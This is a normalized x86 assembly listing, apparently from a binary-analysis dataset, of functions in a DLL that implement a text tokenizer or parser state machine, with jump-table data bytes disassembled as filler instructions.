push 0xa
mov eax 0x8
mov ecx ebx
call sub_1006e0e0
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
add esp 0x4
pop edi
mov eax 0x1
pop esi
mov [ ecx ] 0x6
mov [ edx + 0x34 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax esi
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
mov edi esi
call sub_1006e0a0
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_100732e0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push 0x8
push ebx
mov [ esi + 0x8 ] 0x2
call sub_10020380
add esp 0x8
mov [ esi ] eax
lea ecx [ eax * 4 ]
add eax eax
mov [ esi + 0x8 ] eax
add eax eax
push edi
add eax eax
push eax
push ebx
mov [ ebp - 0x4 ] ecx
call sub_10020380
mov edx [ ebp - 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_100796a0
mov ecx [ esi ]
push ecx
push ebx
call sub_10035fe0
add esp 0x1c
mov [ esi ] edi
pop edi
mov esp ebp
pop ebp
retn
sub_10073350
push ebp
mov ebp esp
push esi
push edi
mov edi eax
push edi
call sub_10016600
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ edi + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
lea edi [ ebx + 0x94 ]
push edi
call sub_10037120
push edi
call sub_1004ac70
mov ecx [ ebp + 0x8 ]
push edi
mov [ esi + 0x10 ] eax
mov [ esi ] ecx
call sub_1003c6e0
mov [ esi + 0x18 ] eax
mov ebx [ ebx ]
add esp 0x10
cmp ebx 0x43
ja r-xdata
pop ebx
movzx edx [ ebx + lookup_table_10073484 ]
jmp [ edx * 4 + jump_table_10073450 ]
pop ebx
pop edi
mov [ esi + 0x1c ] 0x0
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x1
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x2
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x3
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x4
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x5
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x6
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x7
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x8
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x9
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xb
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xc
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0xd
sub_10073491
add eax [ ebx ]
add eax [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x6
pop es
pop es
pop es
or [ eax ] cl
or [ ecx ] al
or [ ecx ] cl
or cl [ ebx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or al 0xcc
int3
sub_100734d0
push ebx
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_10010000
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1004b8a0
push ebx
push esi
call sub_10041660
add edi 0x20
push edi
push esi
call sub_1004b8a0
push edi
push esi
call sub_10041660
add esp 0x24
pop edi
pop ebx
retn
sub_10073510
push esi
mov esi [ eax + 0x8 ]
push edi
lea ecx [ esi + 0x50 ]
push ecx
lea edi [ esi + 0x94 ]
push edi
call sub_10037120
push edi
call sub_1004ac70
add esp 0xc
pop edi
mov [ esi + 0x48 ] eax
pop esi
retn
sub_10073540
push ebp
mov ebp esp
mov eax [ esi + 0x8 ]
push ebx
push edi
add eax 0x10
push eax
push esi
call sub_10017e40
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edi [ esi + 0x8 ]
lea edx [ edi + 0x94 ]
push edx
call sub_10010000
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1004b8a0
push ebx
push esi
call sub_10041660
add edi 0x20
push edi
push esi
call sub_1004b8a0
push edi
push esi
call sub_10041660
add esp 0x2c
pop edi
pop ebx
pop ebp
retn
sub_10073590
push esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edx [ esi + 0x30 ]
push ebx
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x8 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0xc ] ecx
mov edx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] edx
call sub_1004ac70
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_10037120
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
pop ebx
je r-xdata
lea ecx [ esi + 0x94 ]
push ecx
call sub_10032470
add esp 0x4
pop esi
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_10073600
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x80 ]
push eax
push esi
call sub_10035fe0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_10017e40
mov [ edi + 0x80 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_10010000
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1004b8a0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10041660
add ebx 0x20
push ebx
push esi
call sub_1004b8a0
push ebx
push esi
call sub_10041660
add esp 0x34
mov [ edi + 0x8c ] 0x1
pop edi
pop ebx
retn
sub_10073670
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x84 ]
push eax
push esi
call sub_10035fe0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_10017e40
mov [ edi + 0x84 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_10010000
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1004b8a0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10041660
add ebx 0x20
push ebx
push esi
call sub_1004b8a0
push ebx
push esi
call sub_10041660
add esp 0x34
mov [ edi + 0x90 ] 0x1
pop edi
pop ebx
retn
sub_100736e0
push ebp
mov ebp esp
push edi
mov edi eax
lea eax [ esi + 0x1 ]
cmp eax 0x21
ja r-xdata
mov eax 0x5
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10073590
pop edi
pop ebp
retn
movzx eax [ eax + lookup_table_10073770 ]
jmp [ eax * 4 + jump_table_10073760 ]
mov eax 0x4
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10073590
pop edi
pop ebp
retn
push r--data
call sub_1003bee0
mov eax 0x6
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ edi + 0x18 ] esi
call sub_10073590
pop edi
pop ebp
retn
mov eax 0x7
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10073590
pop edi
pop ebp
retn
sub_10073774
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ edx ]
add eax [ edx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_100737a0
push ebx
push edi
mov edi eax
xor ebx ebx
mov [ edi ] ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x7c ]
mov [ edi + 0x18 ] ecx
mov edx [ eax + 0x80 ]
mov [ edi + 0x1c ] edx
mov ecx [ eax + 0x84 ]
mov [ edi + 0x20 ] ecx
mov edx [ eax + 0x88 ]
mov [ edi + 0x24 ] edx
mov ecx [ eax + 0x8c ]
mov [ edi + 0x28 ] ecx
mov edx [ eax + 0x90 ]
mov eax esi
mov [ edi + 0x2c ] edx
call sub_10073590
mov eax [ esi + 0x8 ]
pop edi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
retn
sub_10073810
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0x8 ]
add esi 0x3c
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov [ edi ] 0x2
mov edx [ esi + 0x10 ]
xor ebx ebx
mov [ edi + 0x18 ] edx
cmp [ esi + 0x24 ] ebx
jbe r-xdata
mov [ edi ] 0x1
mov eax [ esi + 0x10 ]
mov [ edi + 0x18 ] eax
mov ecx [ esi + 0x20 ]
mov [ edi + 0x1c ] ecx
mov edx [ esi + 0x24 ]
mov [ edi + 0x20 ] edx
mov eax [ esi + 0x28 ]
mov [ edi + 0x24 ] eax
mov ecx [ esi + 0x3c ]
mov [ edi + 0x28 ] ecx
mov eax [ esi + 0x10 ]
push eax
mov [ esi + 0x34 ] eax
call sub_10045960
push eax
push r--data
call sub_1003bee0
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10035fe0
mov edx [ esi + 0x10 ]
push edx
call sub_10045960
push eax
push r--data
call sub_1003bee0
mov ebx [ ebp + 0x8 ]
add esp 0x14
mov eax [ esi + 0x20 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_100019c0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x24 ]
jb r-xdata
push esi
push ebx
call sub_1004b8a0
mov esi [ ebx + 0x8 ]
add esp 0x8
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ esi + 0x30 ]
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
mov [ edi + 0x8 ] edx
mov eax [ ebx + 0x8 ]
mov [ edi + 0xc ] eax
mov ecx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] ecx
call sub_1004ac70
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_10037120
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
je r-xdata
lea eax [ esi + 0x94 ]
push eax
call sub_10032470
add esp 0x4
mov edx [ edi + 0x14 ]
push eax
push edx
push r--data
call sub_1003bee0
add esp 0xc
pop esi
mov eax 0x1
pop ebx
pop ebp
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_10073950
push esi
mov esi [ ebx + 0x8 ]
push edi
add esi 0x3c
xor edi edi
cmp [ esi + 0x24 ] edi
jbe r-xdata
mov edx [ esi + 0x20 ]
push edx
push ebx
call sub_10035fe0
push esi
push ebx
call sub_1004b8a0
push r--data
call sub_1003bee0
add esp 0x14
pop edi
pop esi
retn
nop
mov eax [ esi + 0x20 ]
mov ecx [ eax + edi * 4 ]
push ecx
push ebx
call sub_100019c0
inc edi
add esp 0x8
cmp edi [ esi + 0x24 ]
jb r-xdata
sub_100739a0
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov esi eax
mov edi [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
push ecx
lea edx [ edi + 0x94 ]
push edx
push esi
call sub_10007c10
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov edi ebx
mov eax esi
mov [ ebx ] 0x5
mov [ ebx + 0x18 ] 0x26
call sub_10073590
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
mov [ edi + 0x4 ] 0x1
push esi
mov esi [ ebp - 0xc ]
mov eax ebx
call sub_100736e0
mov ecx [ ebp - 0x8 ]
add esp 0x4
xor eax eax
cmp [ ebp - 0x4 ] eax
mov [ edi + 0xc ] ecx
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
sub_10073a20
push ebx
push edi
mov edi eax
mov [ edi ] 0x3
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_10017e40
mov [ edi + 0x18 ] eax
mov ebx [ esi + 0x8 ]
lea eax [ ebx + 0x94 ]
push eax
call sub_10010000
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1004b8a0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10041660
add ebx 0x20
push ebx
push esi
call sub_1004b8a0
push ebx
push esi
call sub_10041660
add esp 0x2c
mov eax esi
call sub_10073590
pop edi
mov eax 0x1
pop ebx
retn
sub_10073a80
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebx + 0x8 ]
lea eax [ esi + 0x94 ]
push edi
push eax
call sub_10004030
mov ecx [ esi + 0x10 ]
mov [ esi + 0x1c ] ecx
mov edi [ ebx + 0x8 ]
mov eax [ edi + 0x1c ]
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
mov [ edi + 0x1c ] ecx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x14 ]
add edx [ edi + 0x10 ]
cmp eax edx
jae r-xdata
mov edx [ edi + 0x4 ]
mov [ edi + 0x4 ] ecx
movsx esi [ eax ]
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x4 ] edx
call sub_100736e0
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax 0x1
add [ edi + 0x1c ] eax
mov [ edi + 0x4 ] ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10073af0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
push ebx
push edi
lea edi [ eax + 0x3c ]
add eax 0x94
push eax
call sub_1003c6e0
lea ecx [ eax - 0x41 ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp ecx 0x19
ja r-xdata
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_10041660
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ ebx + 0x94 ]
push eax
call sub_1004ac70
mov edx [ ebp - 0x4 ]
push edi
push edx
push esi
mov [ ebx + 0x48 ] eax
call sub_10016b30
lea eax [ edi + 0x20 ]
push eax
push 0x4
push esi
call sub_100268a0
mov ecx [ ebp + 0x8 ]
xor eax eax
push r--data
mov [ edi + 0x2c ] eax
mov [ edi + 0x38 ] ecx
mov [ edi + 0x3c ] eax
call sub_1003bee0
add esp 0x30
pop edi
pop ebx
mov esp ebp
pop ebp
retn
add eax 0x20
mov [ ebp - 0x4 ] eax
sub_10073b90
push ebx
push edi
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push esi
call sub_10017e40
mov ebx eax
push ebx
call sub_1003fdd0
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_10035fe0
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_10041660
mov edi [ esi + 0x8 ]
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
push ebx
push esi
mov [ edi + 0x48 ] eax
call sub_10035fe0
add esp 0x30
pop edi
pop ebx
retn
sub_10073c00
push ebp
mov ebp esp
push esi
mov esi eax
push edi
push esi
call sub_10016600
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov [ edi ] 0x18
mov ecx [ eax + 0x50 ]
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x54 ]
mov [ edi + 0x8 ] edx
mov ecx [ eax + 0x58 ]
mov [ edi + 0xc ] ecx
mov edx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ edi + 0x1c ] eax
mov [ edi + 0x10 ] edx
mov [ edi + 0x20 ] ecx
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_10017e40
mov [ edi + 0x18 ] eax
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_10035fe0
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_10041660
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_10037120
push edi
call sub_1004ac70
add esp 0x24
mov [ esi + 0x48 ] eax
sub_10073c90
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
xor edx edx
lea eax [ ebx + 0x5c ]
mov [ ebx + 0x68 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ecx
cmp ecx edx
jbe r-xdata
push 0x4c
push edi
call sub_10020380
mov esi eax
mov [ esi ] 0x0
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_10017e40
mov [ esi + 0x4 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x8 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_1004ac70
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ esi + 0xc ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
nop
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_10037120
push r--data
push edi
call sub_1000ad70
mov [ esi + 0x10 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x14 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_1004ac70
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x14 ]
add esp 0x14
mov [ esi + 0x18 ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
dec eax
mov [ esi + 0xc ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebx + 0x40 ]
sub eax edx
cmp eax ecx
jne r-xdata
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_10037120
mov eax [ ebp - 0x10 ]
push eax
push esi
push edi
call sub_100049a0
mov ecx [ edi + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
push edi
call sub_10035fe0
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_10041660
mov edi [ edi + 0x8 ]
lea ecx [ edi + 0x50 ]
push ecx
lea esi [ edi + 0x94 ]
push esi
call sub_10037120
push esi
call sub_1004ac70
add esp 0x30
mov [ edi + 0x48 ] eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ebp - 0xc ]
jb r-xdata
mov eax ecx
mov ecx [ ebx + 0x3c ]
cmp eax 0x4
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov esi [ eax + 0x4 ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
push ecx
push edx
mov eax edi
call sub_10073c00
add esp 0x8
pop edi
pop esi
mov [ ebx + 0x68 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
cmp eax 0x1
jbe r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
je r-xdata
sub_10073e90
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x68 ] 0x0
push edi
je r-xdata
mov ecx [ eax + 0x60 ]
mov edx [ eax + 0x5c ]
mov edi [ edx + ecx * 4 - 0x4 ]
mov eax [ edi + 0x10 ]
push ebx
push eax
push esi
call sub_10035fe0
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_10017e40
mov [ edi + 0x10 ] eax
mov ebx [ esi + 0x8 ]
mov ecx [ ebx + 0x48 ]
lea eax [ ebx + 0x94 ]
push eax
mov [ edi + 0x14 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1004ac70
sub eax [ ebx + 0x48 ]
mov edx [ edi + 0x14 ]
add esp 0x14
mov [ edi + 0x18 ] eax
cmp [ edx + eax - 0x1 ] 0xd
jne r-xdata
mov [ eax + 0x68 ] 0x0
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_10035fe0
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_10041660
mov esi [ esi + 0x8 ]
lea eax [ esi + 0x50 ]
push eax
lea edi [ esi + 0x94 ]
push edi
call sub_10037120
push edi
call sub_1004ac70
add esp 0x1c
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x50 ]
mov [ edi + 0x34 ] ecx
mov edx [ ebx + 0x54 ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x38 ] edx
mov eax [ ebx + 0x58 ]
mov [ edi + 0x3c ] eax
add edi 0x40
push edi
push ecx
call sub_10037120
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_10035fe0
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_10041660
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_10037120
push edi
call sub_1004ac70
add esp 0x24
pop ebx
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
dec eax
mov [ edi + 0x18 ] eax
sub_10073fa0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
xor esi esi
call sub_100736e0
add esp 0x8
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x26
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x7
call sub_100734d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074070
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007415c ]
jmp [ eax * 4 + jump_table_10074148 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x3
pop edi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xa
call sub_100734d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10016b30
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10073590
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074161
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_100741c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10073590
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xd
call sub_100734d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10016b30
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_10074280
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10073590
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x10
call sub_100734d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10016b30
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_10074340
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10073590
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
